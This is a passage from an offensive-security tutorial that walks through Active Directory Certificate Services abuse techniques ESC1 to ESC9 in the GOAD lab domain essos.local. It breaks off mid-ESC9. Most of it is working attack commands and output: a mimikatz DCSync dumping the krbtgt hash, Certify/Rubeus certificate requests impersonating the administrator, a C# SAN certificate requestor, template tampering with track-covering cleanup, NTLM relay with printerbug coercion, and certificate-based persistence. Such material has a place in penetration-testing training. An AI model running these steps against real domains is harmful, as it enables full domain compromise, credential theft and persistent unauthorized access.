# Now perform DCSync as administrator
mimikatz.exe "lsadump::dcsync /domain:essos.local /user:krbtgt"

  .#####.   mimikatz 2.2.0 (x64) #19041 Sep 19 2022 17:44:08
 .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
 ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 ## \ / ##       > https://blog.gentilkiwi.com/mimikatz
 '## v ##'       Vincent LE TOUX             ( vincent.letoux@gmail.com )
  '#####'        > https://pingcastle.com / https://mysmartlogon.com ***/

mimikatz # lsadump::dcsync /domain:essos.local /user:krbtgt
[DC] 'essos.local' will be the domain
[DC] 'meereen.essos.local' will be the DC server
[DC] 'krbtgt' will be the DSRM user

Object RDN           : krbtgt

** SAM ACCOUNT **

SAM Username         : krbtgt
Account Type         : 30000000 ( USER_OBJECT )
User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
Account expiration   :
Password last change : 1/15/2023 2:14:32 PM
Object Security ID   : S-1-5-21-1394808576-3393508183-1134699666-502
Object Relative ID   : 502

Credentials:
  Hash NTLM: a577fcf16cfef780a2ceb343ec39a0d9
    ntlm- 0: a577fcf16cfef780a2ceb343ec39a0d9
    lm  - 0: 367ac3b3d1f4d80b8f52a7b6e8c1d2e9
</code></pre>
<p>Excellent! We've successfully escalated from a domain user (<code>missandei</code>) to domain admin using ESC1.</p>
<p><strong>Key Improvements for ESC1 Attacks:</strong></p>
<ul>
<li>Use <code>/sid</code> parameter for accuracy and to avoid certificate mismatch issues</li>
<li><code>/getcredentials</code> flag extracts NTLM hash directly without needing TGT</li>
<li><code>certutil -MergePFX</code> provides Windows-native certificate conversion</li>
<li>More specific enumeration with <code>/enabled /enrolleeSuppliesSubject</code> flags</li>
</ul>
<h3>Advanced ESC1 Techniques</h3>
<p>For evasion and reliability, consider these advanced approaches using the GOAD environment:</p>
<pre class="language-csharp"><code class="language-csharp">// Custom C# implementation for certificate requests
using System.Security.Cryptography.X509Certificates;
using System.Text;
using CERTENROLLLib;

public class CertificateRequestor
{
    public string RequestCertificate(string caConfig, string template, string altName)
    {
        // Create certificate request
        var request = new CX509CertificateRequestPkcs10();
        var privateKey = new CX509PrivateKey();
        var csp = new CCspInformation();
        
        // Configure private key
        privateKey.ProviderName = "Microsoft Enhanced RSA and AES Cryptographic Provider";
        privateKey.KeySpec = X509KeySpec.XCN_AT_KEYEXCHANGE;
        privateKey.Length = 2048;
        privateKey.Create();
        
        // Build certificate request for GOAD environment
        request.InitializeFromPrivateKey(
            X509CertificateEnrollmentContext.ContextUser,
            privateKey,
            template);
            
        // Add SAN extension for administrator@essos.local
        var sanExtension = new CX509ExtensionAlternativeNames();
        var altNames = new CAlternativeNames();
        var altNameObj = new CAlternativeName();
        
        altNameObj.InitializeFromString(
            AlternativeNameType.XCN_CERT_ALT_NAME_RFC822_NAME,
            altName);
        altNames.Add(altNameObj);
        
        sanExtension.InitializeEncode(altNames);
        request.X509Extensions.Add(sanExtension);
        
        // Submit request
        var enroll = new CX509Enrollment();
        enroll.InitializeFromRequest(request);
        enroll.CertificateFriendlyName = "ESC1 Certificate";
        
        return enroll.CreateRequest(EncodingType.XCN_CRYPT_STRING_BASE64);
    }
}
</code></pre>
<h2>ESC2: Misconfigured Certificate Templates with Any Purpose EKU</h2>
<p>ESC2 targets templates with the "Any Purpose" Extended Key Usage, which essentially means the certificate can be used for anything.</p>
<h3>Vulnerability Conditions</h3>
<ul>
<li>Certificate template has <strong>Any Purpose EKU</strong> (OID: 2.5.29.37.0)</li>
<li><strong>Domain Users</strong> have enrollment rights</li>
<li>No <strong>manager approval</strong> required</li>
</ul>
<p><strong>Important Note:</strong> ESC2 alone does not allow direct impersonation of other users like ESC1. An Any Purpose certificate becomes truly dangerous only when the CA or template also allows SAN/SID injection (ESC 6/9/10). On a fully-patched domain controller with strong certificate mapping enforcement (following KB5014754 patches from May 2022, with full enforcement phases extending through early 2025), an Any-Purpose certificate on its own will not bypass strong certificate mapping.</p>
<h3>Exploitation</h3>
<p>Let's check for ESC2 templates in GOAD:</p>
<pre class="language-bash"><code class="language-bash">Certify.exe find /vulnerable

[!] Vulnerable Certificates Templates :

    CA Name                       : braavos.essos.local\ESSOS-CA
    Template Name                 : ESC2
    Schema Version                : 2
    Validity Period               : 1 year
    Renewal Period                : 6 weeks
    msPKI-Certificate-Name-Flag   : 0x0
    mspki-enrollment-flag         : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required: 0
    pkiextendedkeyusage           : Any Purpose
    msPKI-Application-Policies    : Any Purpose
    Permissions
      Enrollment Permissions
        Enrollment Rights           : ESSOS\Domain Users                    Access: Allow
</code></pre>
<p>In vanilla GOAD, ESC2 template is cloned from the built-in User template and keeps only Any-Purpose EKU (no ENROLLEE_SUPPLIES_SUBJECT flag). If your lab shows the flag, that's ESC1 + AnyPurpose combined.</p>
<p>Now request certificate with Any Purpose EKU (as yourself)</p>
<pre class="language-bash"><code class="language-bash">Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC2

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : ESC2
[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 8

[*] cert.pem                :
-----BEGIN RSA PRIVATE KEY-----
MIIEpAIBAAKCAQEA3kT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW
...certificate data...
-----END CERTIFICATE-----
</code></pre>
<p>Use certificate for client authentication (as the requesting user)</p>
<pre class="language-bash"><code class="language-bash">Rubeus.exe asktgt /user:missandei /certificate:anypurpose.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[+] TGT request successful!
</code></pre>
<p>The Any Purpose EKU can still be dangerous as it bypasses many certificate validation checks and can be used for code signing, server authentication, and other purposes beyond the intended use case.</p>
<h2>ESC3: Enrollment Agent Templates</h2>
<p>ESC3 is a really cool technique that exploits certificate templates granting Certificate Request Agent (Enrollment Agent) permissions. Basically, you can request certificates on behalf of other users once you get an agent certificate.</p>
<h3>Attack Flow</h3>
<p>The attack is pretty straightforward:</p>
<ol>
<li>Request an Enrollment Agent certificate</li>
<li>Use that agent certificate to request certificates for other users</li>
<li>Authenticate as those users</li>
</ol>
<h3>Implementation</h3>
<p>Let's see this in action with our GOAD environment:</p>
<p>Step 1: Request Enrollment Agent certificate
The built-in template is called "EnrollmentAgent" - clone it to ESC3-CRA for your lab if needed</p>
<pre class="language-bash"><code class="language-bash">Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:EnrollmentAgent

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\khal.drogo
[*] Template                : EnrollmentAgent
[*] Subject                 : CN=khal.drogo, CN=Users, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 9

[*] cert.pem                :
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAzGQ5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQWxkT8F6PSyEz
...enrollment agent certificate...
-----END CERTIFICATE-----
</code></pre>
<p>Step 2: Use agent certificate to request certificate for Domain Admin</p>
<pre class="language-bash"><code class="language-bash">Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /onbehalfof:ESSOS\administrator /enrollcert:agent.pfx /enrollcertpw:mimikatz

[*] Action: Request a Certificates on behalf of another user
[*] Current user context    : ESSOS\khal.drogo
[*] Template                : User
[*] On behalf of            : ESSOS\administrator
[*] Agent Certificate       : agent.pfx

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 10

[*] cert.pem                :
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA8Fj9BNQ3T4Uy8F0aGF9ZLQWxkT8F6PSyEzGCq5VJXpF8rTQ
...administrator certificate...
-----END CERTIFICATE-----
</code></pre>
<p>Step 3: Authenticate as administrator</p>
<pre class="language-bash"><code class="language-bash">Rubeus.exe asktgt /user:administrator /certificate:admin.pfx

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=administrator, CN=Users, DC=essos, DC=local
[+] TGT request successful!

  ServiceName              : krbtgt/essos.local
  ServiceRealm             : ESSOS.LOCAL
  UserName                 : administrator
  UserRealm                : ESSOS.LOCAL
  StartTime                : 1/3/2025 11:15:23 AM
  EndTime                  : 1/3/2025 9:15:23 PM
  RenewTill                : 1/10/2025 11:15:23 AM
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable
</code></pre>
<p>Perfect! We've escalated from <code>khal.drogo</code> to <code>administrator</code> using the ESC3 technique.</p>
<h2>ESC4: Vulnerable Certificate Template Access Control</h2>
<p>ESC4 is one of my favorite techniques because it's sneaky. Instead of exploiting existing vulnerable templates, you modify a secure template to make it vulnerable, exploit it, then clean up your tracks.</p>
<h3>Exploitation Strategy</h3>
<p>Here's how the attack works:</p>
<ol>
<li>Find templates where you have dangerous permissions (WriteProperty or WriteOwner)</li>
<li>Modify the template to make it vulnerable to ESC1</li>
<li>Exploit the newly vulnerable template</li>
<li>Clean up your modifications to cover your tracks</li>
</ol>
<h3>Practical Implementation</h3>
<p>Let's see what we can modify in GOAD. Find templates with vulnerable ACLs:</p>
<pre class="language-bash"><code class="language-bash">Certify.exe find /vulnerable

[!] Vulnerable Certificates Templates :

    CA Name                       : braavos.essos.local\ESSOS-CA
    Template Name                 : ESC4
    Schema Version                : 2
    Validity Period               : 1 year
    Renewal Period                : 6 weeks
    msPKI-Certificate-Name-Flag   : 0x0
    mspki-enrollment-flag         : INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required: 0
    pkiextendedkeyusage           : Client Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : ESSOS\Domain Users                    Access: Allow
      Object Control Permissions
        Owner                       : ESSOS\Administrator
        WriteProperty Principals    : ESSOS\khal.drogo                     Access: Allow
        WriteDacl Principals        : ESSOS\Administrator

# First, backup original template settings for cleanup
Get-ADObject "CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -Properties * | Select-Object * | Export-Clixml ESC4-backup.xml

# Modify template to enable ENROLLEE_SUPPLIES_SUBJECT
$template = Get-ADObject "CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local"
Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=1}

[*] Template ESC4 modified to enable ENROLLEE_SUPPLIES_SUBJECT

# Wait for AD replication
Start-Sleep -Seconds 30

# Request certificate with arbitrary SAN
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC4 /altname:upn:administrator@essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\khal.drogo
[*] Template                : ESC4
[*] Subject                 : CN=khal.drogo, CN=Users, DC=essos, DC=local
[*] AltName                 : administrator@essos.local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 11

# Authenticate as administrator
Rubeus.exe asktgt /user:administrator /certificate:admin.pfx

[+] TGT request successful!

# Restore original template (cleanup)
$template = Get-ADObject "CN=ESC4,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local"
Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=0}

[*] Template ESC4 restored to original configuration
</code></pre>
<h3>PowerShell Template Modification</h3>
<p>Here's a more robust script for template modification in GOAD:</p>
<pre class="language-bash"><code class="language-bash">function Modify-CertificateTemplate {
    param(
        [string]$TemplateName,
        [switch]$EnableSubjectAltName,
        [switch]$Restore,
        [string]$Domain = "essos.local"
    )
    
    $configPath = "CN=Configuration," + (Get-ADDomain -Identity $Domain).DistinguishedName
    $templatePath = "CN=$TemplateName,CN=Certificate Templates,CN=Public Key Services,CN=Services,$configPath"
    
    try {
        $template = Get-ADObject $templatePath -Properties "msPKI-Certificate-Name-Flag"
        
        if ($Restore) {
            # Restore to secure setting
            Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=0}
            Write-Host "[+] Template $TemplateName restored to secure configuration"
        } else {
            # Enable ENROLLEE_SUPPLIES_SUBJECT
            Set-ADObject $template.DistinguishedName -Replace @{"msPKI-Certificate-Name-Flag"=1}
            Write-Host "[+] Template $TemplateName modified to enable subject specification"
        }
        
        # Wait for AD replication
        Write-Host "[*] Waiting for AD replication..."
        Start-Sleep -Seconds 30
        
    } catch {
        Write-Error "Failed to modify template: $($_.Exception.Message)"
    }
}

# Usage in GOAD environment
Modify-CertificateTemplate -TemplateName "ESC4" -EnableSubjectAltName -Domain "essos.local"
# ... perform attack ...
Modify-CertificateTemplate -TemplateName "ESC4" -Restore -Domain "essos.local"
</code></pre>
<h2>ESC5: Vulnerable PKI Object Access Control</h2>
<p>ESC5 exploits weak permissions on PKI objects themselves, including the CA server and certificate templates container.</p>
<h3>Attack Vectors</h3>
<ol>
<li><strong>CA Server Object</strong>: WriteProperty permission allows configuration changes</li>
<li><strong>Certificate Templates Container</strong>: GenericWrite allows template creation</li>
<li><strong>Individual CA Objects</strong>: Various dangerous permissions</li>
</ol>
<p>Let's examine what we have in GOAD. Check CA object permissions in essos.local domain:</p>
<pre class="language-bash"><code class="language-bash">Get-ADObject "CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -Properties nTSecurityDescriptor

DistinguishedName : CN=ESSOS-CA,CN=Enrollment Services,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
Name              : ESSOS-CA
ObjectClass       : pKIEnrollmentService
ObjectGUID        : 4f8bd644-2c29-418c-93f1-fe926f91f6b4

# In GOAD, khal.drogo has interesting permissions on the CA
</code></pre>
<h3>CA Configuration Modification</h3>
<p>If you have WriteProperty, modify CA settings. Enable SAN in issued certificates:</p>
<pre class="language-bash"><code class="language-bash">certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2

CertUtil: -setreg command completed successfully.
The command completed successfully.
</code></pre>
<p>Restart certificate services to apply changes</p>
<pre class="language-bash"><code class="language-bash">net stop certsvc &#x26;&#x26; net start certsvc

The Certificate Services service is stopping.
The Certificate Services service was stopped successfully.
The Certificate Services service is starting.
The Certificate Services service was started successfully.

# Wait for services to fully restart
Start-Sleep -Seconds 10
</code></pre>
<p>Now we can request certificate with SAN from any template:</p>
<pre class="language-bash"><code class="language-bash">Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /altname:upn:administrator@essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\khal.drogo
[*] Template                : User
[*] Subject                 : CN=khal.drogo, CN=Users, DC=essos, DC=local
[*] AltName                 : administrator@essos.local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 12
</code></pre>
<h3>Certificate Template Creation</h3>
<p>If you have GenericWrite on the Certificate Templates container in GOAD, create a new vulnerable template:</p>
<pre class="language-bash"><code class="language-bash">$templateDN = "CN=EvilTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local"

# Template with dangerous settings for GOAD environment
New-ADObject -Name "EvilTemplate" -Type "pKICertificateTemplate" -Path "CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local" -OtherAttributes @{
    'flags' = 131680
    'msPKI-Certificate-Name-Flag' = 1
    'msPKI-Enrollment-Flag' = 41
    'msPKI-Minimal-Key-Size' = 2048
    'msPKI-Private-Key-Flag' = 16842752
    'msPKI-Template-Schema-Version' = 2
    'pKIDefaultKeySpec' = 1
    'pKIExpirationPeriod' = ([byte[]](0x00,0x40,0x1E,0xA4,0xE8,0x65,0xFA,0xFF))
    'pKIExtendedKeyUsage' = @('1.3.6.1.5.5.7.3.2')
    'pKIKeyUsage' = ([byte[]](0x80,0x00))
    'pKIOverlapPeriod' = ([byte[]](0x00,0x80,0xA6,0x0A,0xFF,0xDE,0xFF,0xFF))
    'revision' = 100
}

ObjectGUID                : 8f3e2a1b-9c4d-4e5f-a6b7-c8d9e0f1a2b3
DistinguishedName         : CN=EvilTemplate,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local
Name                      : EvilTemplate
ObjectClass               : pKICertificateTemplate

# Template created successfully and ready for exploitation
</code></pre>
<h2>ESC6: EDITF_ATTRIBUTESUBJECTALTNAME2</h2>
<p>ESC6 exploits the <code>EDITF_ATTRIBUTESUBJECTALTNAME2</code> flag on the CA, which allows SAN specification in any certificate request.</p>
<p><em>For detailed information on this vulnerability and remediation steps, see Microsoft Learn's <a href="https://learn.microsoft.com/en-us/defender-for-identity/security-assessment-edit-vulnerable-ca-setting">"Edit vulnerable Certificate Authority setting (ESC6)"</a> article.</em></p>
<h3>Vulnerability Check</h3>
<p>Let's check the GOAD CA configuration. Check if flag is enabled on ESSOS-CA:</p>
<pre class="language-bash"><code class="language-bash">certutil -config "braavos.essos.local\ESSOS-CA" -getreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags

HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\CertSvc\Configuration\ESSOS-CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags REG_DWORD = 0x144120 (1327392)

EDITF_ATTRIBUTESUBJECTALTNAME2 -- 40000 (262144)
EDITF_ATTRIBUTEENDDATE -- 20000 (131072)
EDITF_ATTRIBUTECA -- 4000 (16384)
EDITF_IGNOREREQUESTERGROUP -- 100000 (1048576)
CertUtil: -getreg command completed successfully.

# Flag 0x40000 (EDITF_ATTRIBUTESUBJECTALTNAME2) is present!
</code></pre>
<h3>Exploitation</h3>
<p><strong>Note:</strong> Since the Microsoft hardening released in KB5014754 (May 10, 2022), certificates issued via a CA that still has EDITF_ATTRIBUTESUBJECTALTNAME2 enabled must contain the new SID security extension or rely on weak mapping modes; otherwise logon is refused. ESC6 exploitation therefore commonly requires ESC9 or ESC10 conditions as well.</p>
<p>Find CAs with EDITF_ATTRIBUTESUBJECTALTNAME2 flag set:</p>
<pre class="language-bash"><code class="language-bash">Certify.exe find /vulnerable

[!] Vulnerable Certificates Templates :
[!] Certificate Authority has EDITF_ATTRIBUTESUBJECTALTNAME2 flag set!

    Enterprise CA Name            : ESSOS-CA
    DNS Hostname                  : braavos.essos.local
    FullName                      : braavos.essos.local\ESSOS-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=ESSOS-CA, DC=essos, DC=local
    UserSpecifiedSAN              : Enabled (ESC6)
</code></pre>
<p>Request certificate with arbitrary SAN using any template:</p>
<pre class="language-bash"><code class="language-bash">Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:User /altname:administrator@essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : User
[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local
[*] AltName                 : administrator@essos.local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 13
</code></pre>
<p>Even though template doesn't allow subject specification,
ESC6 allows it through the CA configuration</p>
<h3>Enabling the Flag (if you have CA admin rights). Enable the dangerous flag on GOAD CA:</h3>
<pre class="language-bash"><code class="language-bash">certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2

CertUtil: -setreg command completed successfully.
</code></pre>
<p>Restart certificate services:</p>
<pre class="language-bash"><code class="language-bash">Restart-Service CertSvc

WARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to stop...
WARNING: Waiting for service 'Active Directory Certificate Services (CertSvc)' to start...

Status   Name               DisplayName
------   ----               -----------
Running  CertSvc            Active Directory Certificate Services
</code></pre>
<h2>ESC7: Vulnerable Certificate Authority Access Control</h2>
<p>ESC7 is all about getting direct access to the CA itself. If you can get ManageCA or ManageCertificates permissions, you basically own the entire certificate infrastructure.</p>
<p>Let's see what permissions we have in GOAD. Check if we have ManageCA rights:</p>
<pre class="language-bash"><code class="language-bash">Certify.exe find /vulnerable

[!] Vulnerable Certificates Templates :

    CA Name                       : braavos.essos.local\ESSOS-CA
    Permissions
      Owner                       : BUILTIN\Administrators        Access: GenericAll
      Access Rights               : ESSOS\Domain Admins           Access: GenericAll
      Access Rights               : ESSOS\Enterprise Admins       Access: GenericAll
      Access Rights               : ESSOS\viserys.targaryen       Access: ManageCA
      Access Rights               : ESSOS\viserys.targaryen       Access: ManageCertificates
</code></pre>
<p>Perfect! <code>viserys.targaryen</code> has ManageCA and ManageCertificates rights in GOAD.</p>
<h3>ManageCA Rights Exploitation</h3>
<p>ManageCA rights are like having the keys to the kingdom. Here's what you can do:</p>
<pre class="language-bash"><code class="language-bash"># If you have ManageCA, you can:
# 1. Enable EDITF_ATTRIBUTESUBJECTALTNAME2
certutil -config "braavos.essos.local\ESSOS-CA" -setreg CA\PolicyModules\CertificateAuthority_MicrosoftDefault.Policy\EditFlags +EDITF_ATTRIBUTESUBJECTALTNAME2

CertUtil: -setreg command completed successfully.

# 2. Certificate manager rights
# As the Certify output indicated, viserys.targaryen already possesses ManageCA and ManageCertificates rights in our GOAD scenario.
# An attacker gaining these rights would typically do so by compromising an account that already has them, or by escalating to a level
# where they can modify the CA's Active Directory object permissions or the CA server's local groups.
# With ManageCA rights, one can assign officer rights (ManageCertificates) through the Certificate Authority console (certsrv.msc).

# 3. Restart services to apply changes
Restart-Service CertSvc
</code></pre>
<h3>ManageCertificates Rights Exploitation</h3>
<p>With ManageCertificates, approve pending requests. First, submit a request for a privileged user using SubCA template:</p>
<pre class="language-bash"><code class="language-bash">Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:SubCA /altname:administrator@essos.local

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\viserys.targaryen
[*] Template                : SubCA
[*] Subject                 : CN=viserys.targaryen, CN=Users, DC=essos, DC=local
[*] AltName                 : administrator@essos.local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : Taken Under Submission
[*] Request ID              : 14

# The request is pending, now approve it with ManageCertificates permission
certutil -config "braavos.essos.local\ESSOS-CA" -approve 14

# Expected output:
# Request 14 approved.
# CertUtil: -approve command completed successfully.

# Retrieve the issued certificate
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /retrieve 14

[*] Action: Retrieve Certificates
[*] Request ID: 14
[*] Certificate retrieved successfully
</code></pre>
<h2>ESC8: NTLM Relay to AD CS HTTP Endpoints</h2>
<p>ESC8 is where things get really interesting. It combines ADCS with NTLM relay attacks, targeting HTTP-based certificate enrollment endpoints. I love this technique because it leverages two different attack vectors together.</p>
<h3>Prerequisites</h3>
<p>In GOAD, we have perfect conditions for ESC8:</p>
<ul>
<li>ADCS web enrollment <strong>enabled</strong></li>
<li><strong>HTTP enrollment endpoint</strong> accessible at <code>http://braavos.essos.local/certsrv/</code></li>
<li>We can perform <strong>NTLM relay</strong> attacks</li>
</ul>
<p>NTLM relay works against both HTTP and HTTPS enrollment pages; the protocol matters less than whether Extended Protection for Authentication (EPA) or channel binding tokens are required. Enable EPA and require SSL to break the relay attack.</p>
<h3>Attack Implementation</h3>
<p>Let's test the web enrollment endpoint first:</p>
<pre class="language-bash"><code class="language-bash"># Check if ADCS web enrollment is accessible
curl -I http://braavos.essos.local/certsrv/certfnsh.asp

HTTP/1.1 401 Unauthorized
Content-Length: 1293
Content-Type: text/html
Server: Microsoft-IIS/10.0
WWW-Authenticate: Negotiate
WWW-Authenticate: NTLM
Date: Thu, 03 Jan 2025 16:45:12 GMT
</code></pre>
<p>Perfect! It's requesting NTLM authentication. Now let's set up the relay attack:</p>
<pre class="language-bash"><code class="language-bash"># Set up NTLM relay to ADCS HTTP endpoint
python3 ntlmrelayx.py -t http://braavos.essos.local/certsrv/certfnsh.asp -smb2support --adcs-attack --adcs-template "DomainController"

Impacket v0.11.0 - Copyright 2023 Fortra
Note: Output may vary slightly between versions - banners truncated for brevity

[*] Protocol Client DCOM loaded..
[*] Protocol Client LDAPS loaded..
[*] Protocol Client LDAP loaded..
[*] Protocol Client SMB loaded..
[*] Protocol Client SMTP loaded..
[*] Protocol Client MSSQL loaded..
[*] Protocol Client HTTP loaded..
[*] Protocol Client HTTPS loaded..
[*] Running in relay mode to single host
[*] Setting up SMB Server
[*] Setting up HTTP Server
[*] Setting up WCF Server

[*] Servers started, waiting for connections

# In another terminal, trigger authentication from target DC
python3 printerbug.py essos.local/missandei:fr3edom@meereen.essos.local braavos.essos.local

[*] Impacket v0.11.0 - Copyright 2023 Fortra
[*] Attempting to trigger authentication via rprn RPC at meereen.essos.local
[*] Bind OK
[*] Got handle
DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
[*] Triggered RPC backconnect, this may or may not have worked

# Back in ntlmrelayx window:
[*] SMBD-Thread-4: Connection from MEEREEN/192.168.56.12 controlled, attacking target http://braavos.essos.local
HTTP        : success, Cert saved to /tmp/MEEREEN$cert.b64
[*] ADCS attack completed. Generated certificate for user MEEREEN$

# Certificate successfully obtained!
</code></pre>
<p>Let's convert and use the certificate:</p>
<pre class="language-bash"><code class="language-bash"># Convert base64 certificate for use
cat /tmp/MEEREEN$cert.b64 | base64 -d > meereen.pfx

# Ask for a TGT with the machine certificate
gettgtpkinit.py essos.local/meereen$ -pfx-file meereen.pfx meereen.ccache

Impacket v0.11.0 - Copyright 2023 Fortra

[*] Using TGT from cache file meereen.ccache
[*] Requesting TGT for meereen$@essos.local using Kerberos PKINIT
[+] TGT request successful!
[*] Saved TGT to meereen.ccache

# Use machine certificate for further attacks or DCSync
</code></pre>
<h2>ESC9: No Security Extension</h2>
<p>ESC9 is pure gold for persistence. It exploits certificate templates that don't require the szOID_NTDS_CA_SECURITY_EXT security extension in issued certificates. This means your certificates keep working even when passwords change.</p>
<h3>Vulnerability Details</h3>
<p>When certificates lack the security extension, they provide persistent authentication that survives password changes. This is what makes them perfect for maintaining long-term access.</p>
<h3>Key Point</h3>
<p>A certificate issued from a <code>NO_SECURITY_EXTENSION</code> template will still map even after the user changes their password, making it perfect for persistence.</p>
<h3>Exploitation Process</h3>
<p>Let's test this in our GOAD environment:</p>
<pre class="language-bash"><code class="language-bash"># Find templates without security extension requirement
Certify.exe find /vulnerable

[!] Vulnerable Certificates Templates :

    CA Name                       : braavos.essos.local\ESSOS-CA
    Template Name                 : ESC9
    Schema Version                : 2
    Validity Period               : 1 year
    Renewal Period                : 6 weeks
    msPKI-Certificate-Name-Flag   : 0x0
    mspki-enrollment-flag         : NO_SECURITY_EXTENSION, INCLUDE_SYMMETRIC_ALGORITHMS, PUBLISH_TO_DS
    Authorized Signatures Required: 0
    pkiextendedkeyusage           : Client Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : ESSOS\Domain Users                    Access: Allow

# Request certificate for current user (missandei)
Certify.exe request /ca:braavos.essos.local\ESSOS-CA /template:ESC9

[*] Action: Request a Certificates
[*] Current user context    : ESSOS\missandei
[*] Template                : ESC9
[*] Subject                 : CN=missandei, CN=Users, DC=essos, DC=local

[*] Certificate Authority   : braavos.essos.local\ESSOS-CA
[*] CA Response             : The certificate has been issued.
[*] Request ID              : 15

[*] cert.pem                :
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEA2hT8F6PSyEzGCq5VJXpF8rTQoYmZ9BNQ3T4Uy8F0aGF9ZLQW
...certificate without security extension...
-----END CERTIFICATE-----

# Test authentication with current certificate

Rubeus.exe asktgt /user:missandei /certificate:missandei.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[+] TGT request successful!

# Now change the user's password
net user missandei "NewComplexPassword123!" /domain

The command completed successfully.

# Certificate still works for authentication even after password change!

Rubeus.exe asktgt /user:missandei /certificate:missandei.pfx /password:mimikatz

[*] Action: Ask TGT
[*] Using PKINIT with etype rc4_hmac and subject: CN=missandei, CN=Users, DC=essos, DC=local
[+] TGT request successful!

  UserName                 : missandei
  UserRealm                : ESSOS.LOCAL
  ServiceName              : krbtgt/essos.local
  ServiceRealm             : ESSOS.LOCAL
  StartTime                : 1/3/2025 5:30:45 PM
  EndTime                  : 1/4/2025 3:30:45 AM
  RenewTill                : 1/10/2025 5:30:45 PM
  Flags                    : name_canonicalize, pre_authent, initial, renewable, forwardable

# Perfect persistence! The certificate still authenticates despite password change
</code></pre>
<h3>Template Analysis</h3>
<p>Check if template requires security extension in GOAD:</p>
<pre class="language-bash"><code class="language-bash">$templateDN = "CN=ESC9,CN=Certificate Templates,CN=Public Key Services,CN=Services,CN=Configuration,DC=essos,DC=local"
$template = Get-ADObject -Identity $templateDN -Properties msPKI-Enrollment-Flag

# The CT_FLAG_NO_SECURITY_EXTENSION flag value is 0x80000 (524288)
$NoSecurityExtensionFlag = 0x80000

if ($template.'msPKI-Enrollment-Flag' -band $NoSecurityExtensionFlag) {
    Write-Host "Template '$($template.Name)' has the NO_SECURITY_EXTENSION flag set."
} else {
